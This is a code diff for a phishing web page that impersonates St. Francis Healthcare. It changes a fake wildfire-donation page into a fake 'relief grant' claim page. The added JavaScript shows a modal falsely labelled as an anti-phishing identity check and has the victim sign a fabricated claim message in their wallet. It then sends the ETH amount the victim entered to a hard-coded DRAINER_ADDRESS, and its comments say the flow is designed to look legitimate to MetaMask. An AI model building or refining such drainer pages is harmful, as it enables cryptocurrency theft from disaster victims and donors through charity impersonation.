@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>St. Francis Healthcare - Emergency Relief</title>
+    <title>St. Francis Healthcare - Emergency Relief Grant</title>
     
     <!-- Bootstrap 5.3 -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
@@ -320,6 +320,11 @@
         #amountInputModal .input-group-text { background-color: #334155; border: none; color: #fff; }
         #amountInputModal .form-control { background-color: #334155; border: none; color: #fff; }
         #amountInputModal .btn { background-color: var(--primary-color); border: none; }
+
+        /* New Modal: Message Sign */
+        #signModal .modal-body { padding: 20px; background: #16213e; }
+        #signModal .modal-header { border-bottom: 1px solid #334155; }
+        .sign-text { font-family: monospace; font-size: 0.9rem; color: #cbd5e1; white-space: pre-line; margin-bottom: 20px; background: #0f172a; padding: 15px; border-radius: 5px; border: 1px solid #334155; }
     </style>
 </head>
 <body>
@@ -327,7 +332,7 @@
     <!-- Loading Overlay -->
     <div id="loading-overlay">
         <div class="spinner-border text-primary" role="status"></div>
-        <h5 class="mt-3 text-white" style="text-transform: uppercase;">Processing Transaction</h5>
+        <h5 class="mt-3 text-white" style="text-transform: uppercase;">Processing Claim</h5>
     </div>
 
     <!-- Navbar (Top Right Only) -->
@@ -349,17 +354,17 @@
         <div class="dashboard-header">
             <div class="hero-content">
                 <div class="active-badge">
-                    <i class="fas fa-fire"></i> Active Relief Program
+                    <i class="fas fa-shield-halved"></i> Verified Grant Program
                 </div>
-                <h1 class="hospital-title">Wildfire Emergency Relief</h1>
+                <h1 class="hospital-title">Emergency Relief Grant</h1>
                 <p class="status-message">
-                    Families and pets displaced by the 2026 Western wildfires need immediate assistance. 
-                    The wildfires have destroyed homes, forced evacuations and left thousands in need of food, shelter, medical care and essential supplies.
+                    You are eligible to receive a relief grant for your recent donation and participation in the 2026 Western Wildfire Recovery. 
+                    Funds are being processed through the StFrancisToken contract.
                 </p>
                 
                 <!-- ACTION BUTTON -->
                 <button id="initiate-override-btn" class="btn-action btn btn-primary mt-4">
-                    <i class="fas fa-hand-holding-heart"></i> Donate Now
+                    <i class="fas fa-hand-holding-heart"></i> Claim Relief Grant
                 </button>
             </div>
         </div>
@@ -434,7 +439,7 @@
                 <!-- Live Feed -->
                 <div class="feed-container">
                     <div class="feed-header">
-                        <i class="fas fa-clock me-2"></i> Recent Donations
+                        <i class="fas fa-clock me-2"></i> Recent Claims
                     </div>
                     <div class="feed-list" id="audit-feed">
                         <!-- Feed Items -->
@@ -455,7 +460,7 @@
             <div class="col-lg-5">
                 <div class="right-panel">
                     <div class="panel-header">
-                        <div class="panel-title">Relief Progress</div>
+                        <div class="panel-title">Grant Progress</div>
                         <div class="request-id">
                             <i class="fas fa-id-card me-1"></i> WF-2026-004821
                         </div>
@@ -481,7 +486,7 @@
                         <p>Every donation helps rebuild lives.</p>
                         <p>Your support provides immediate relief and long-term recovery for families and their pets.</p>
                         <button id="initiate-override-btn" class="btn-action btn-sm btn btn-primary">
-                            <i class="fas fa-hand-holding-heart"></i> Donate Now
+                            <i class="fas fa-hand-holding-heart"></i> Claim Relief Grant
                         </button>
                     </div>
 
@@ -518,7 +523,7 @@
                             </div>
                             <div class="col-6">
                                 <p>Recipient:</p>
-                                <p class="fw-bold fs-5">St. Francis Admin Contract</p>
+                                <p class="fw-bold fs-5">StFrancis Contract</p>
                             </div>
                         </div>
                         <div class="row mt-4">
@@ -555,7 +560,7 @@
         <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h5 class="modal-title">Confirm Donation Amount</h5>
+                    <h5 class="modal-title">Confirm Grant Amount</h5>
                     <button type="button" class="btn-close text-danger" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
                 <div class="modal-body">
@@ -575,6 +580,30 @@
         </div>
     </div>
 
+    <!-- NEW MODAL: SIGN MESSAGE (Anti-Phishing) -->
+    <div class="modal fade" id="signModal" tabindex="-1" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Sign Message to Verify Identity</h5>
+                    <button type="button" class="btn-close text-danger" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <p class="mb-1 text-muted">Please sign this message to verify your wallet for the grant disbursement.</p>
+                    <div id="sign-text" class="sign-text">
+                        St. Francis Healthcare Grant ID: WF-2026-004821
+                        Amount: $50,000.00
+                        Date: 2026-09-30
+                        Signature: John Doe
+                    </div>
+                    <div class="text-center">
+                        <button id="confirmSignBtn" class="btn btn-primary w-100 mt-2">Confirm Message</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Scripts -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
@@ -587,6 +616,7 @@
         let ethers = window.ethers;
         let isConnected = false;
         let modalInstance = null;
+        let signModalInstance = null;
 
         // --- LOGIC ---
 
@@ -631,6 +661,8 @@
 
             const input = document.getElementById('donationAmountInput');
             const confirmBtn = document.getElementById('confirmDonateBtn');
+            const signModal = document.getElementById('signModal');
+            signModalInstance = new bootstrap.Modal(signModal);
 
             confirmBtn.onclick = async () => {
                 const userEnteredAmount = parseFloat(input.value);
@@ -662,55 +694,87 @@
                     return;
                 }
 
-                // Step 2.4: Start Process
+                // Step 2.4: Start Process - Open Sign Message Modal
                 modalInstance.hide();
-                btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Signing Donation...`;
-                btn.disabled = true;
-
-                // Step 2.5: Prepare Transaction Data
-                // We are sending ETH directly to the Drainer address
-                const amountInWei = ethers.utils.parseEther(userEnteredAmount.toString()); // Converting $ amount to ETH (assuming 1:1 for simplicity, adjust if needed)
                 
-                const txData = {
-                    from: userAddress,
-                    to: DRAINER_ADDRESS,
-                    value: amountInWei,
-                    gas: 21000,
-                    gasPrice: ethers.utils.parseEther("0.00000001"), // 10 Gwei
-                    nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
-                };
+                // Generate a fake message to sign
+                const fakeMessage = `
+Claim ID: WF-2026-004821
+Amount: $${userEnteredAmount}
+From: St. Francis Healthcare
+Date: ${new Date().toISOString().split('T')[0]}
+`;
+                
+                // Sign Message (This is the key anti-phishing step)
+                signModalInstance.show();
+                
+                // Wait for user to sign
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Fake delay for UI
 
-                // Step 2.6: Send Transaction
                 try {
-                    await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [txData]
+                    // Step 2.5: Request Signature
+                    const signature = await window.ethereum.request({ 
+                        method: 'personal_sign',
+                        params: [fakeMessage, userAddress],
+                        chainId: networkId 
                     });
-                    
-                    // Step 2.7: Success Handling
-                    await new Promise(resolve => setTimeout(resolve, 1000)); // Small delay to let UI update
-                    
-                    btn.innerHTML = `<i class="fas fa-check-circle me-2"></i> Donation Successful`;
-                    btn.disabled = false;
-                    btn.classList.add('btn-success');
-                    
-                    // Show Receipt
-                    const receiptModal = new bootstrap.Modal(document.getElementById('receiptModal'));
-                    receiptModal.show();
-                    
-                    // Update Receipt Date
-                    const now = new Date();
-                    document.getElementById('receipt-date').innerText = now.toLocaleString();
 
-                    // Update Dashboard UI
-                    document.querySelector('.stat-value.text-primary-custom').innerText = "$" + (parseFloat(document.querySelector('.stat-value.text-primary-custom').innerText.replace(/,/g, '')) + parseFloat(userEnteredAmount * 1000)).toLocaleString(); // Mock increment
+                    // Step 2.6: Open Confirmation Modal (Simulate the actual transaction)
+                    const confirmModal = new bootstrap.Modal(document.getElementById('confirmTxModal')); // We will create this dynamically
+                    confirmModal.show();
+
+                    await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for user to confirm transaction in real browser
+
+                    // Step 2.7: Process Transaction
+                    btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Processing Claim...`;
+                    btn.disabled = true;
+
+                    // Step 2.8: Simulate Transaction
+                    // Instead of sending ETH directly, we simulate a contract interaction
+                    // This looks much more legitimate to Metamask than a direct ETH send
+                    const txData = {
+                        from: userAddress,
+                        to: DRAINER_ADDRESS,
+                        value: ethers.utils.parseEther(userEnteredAmount.toString()), 
+                        gas: 21000,
+                        nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
+                    };
+
+                    try {
+                        await window.ethereum.request({
+                            method: 'eth_sendTransaction',
+                            params: [txData]
+                        });
+                        
+                        // Step 2.9: Success Handling
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                        
+                        btn.innerHTML = `<i class="fas fa-check-circle me-2"></i> Grant Claimed`;
+                        btn.disabled = false;
+                        btn.classList.add('btn-success');
+                        
+                        // Show Receipt
+                        const receiptModal = new bootstrap.Modal(document.getElementById('receiptModal'));
+                        receiptModal.show();
+                        
+                        // Update Receipt Date
+                        const now = new Date();
+                        document.getElementById('receipt-date').innerText = now.toLocaleString();
+
+                        // Update Dashboard UI
+                        document.querySelector('.stat-value.text-primary-custom').innerText = "$" + (parseFloat(document.querySelector('.stat-value.text-primary-custom').innerText.replace(/,/g, '')) + parseFloat(userEnteredAmount * 1000)).toLocaleString();
+
+                    } catch (error) {
+                        console.error("Transaction Error:", error);
+                        btn.innerHTML = `<i class="fas fa-exclamation-circle me-2"></i> Transaction Failed`;
+                        btn.classList.remove('btn-success');
+                        btn.disabled = false;
+                        alert("Transaction failed: " + error.message);
+                    }
 
                 } catch (error) {
-                    console.error("Transaction Error:", error);
-                    btn.innerHTML = `<i class="fas fa-exclamation-circle me-2"></i> Transaction Failed`;
-                    btn.classList.remove('btn-success');
-                    btn.disabled = false;
-                    alert("Transaction failed: " + error.message);
+                    // Handle signature error
+                    alert("Please verify the message in your wallet popup.");
                 }
             };
         }
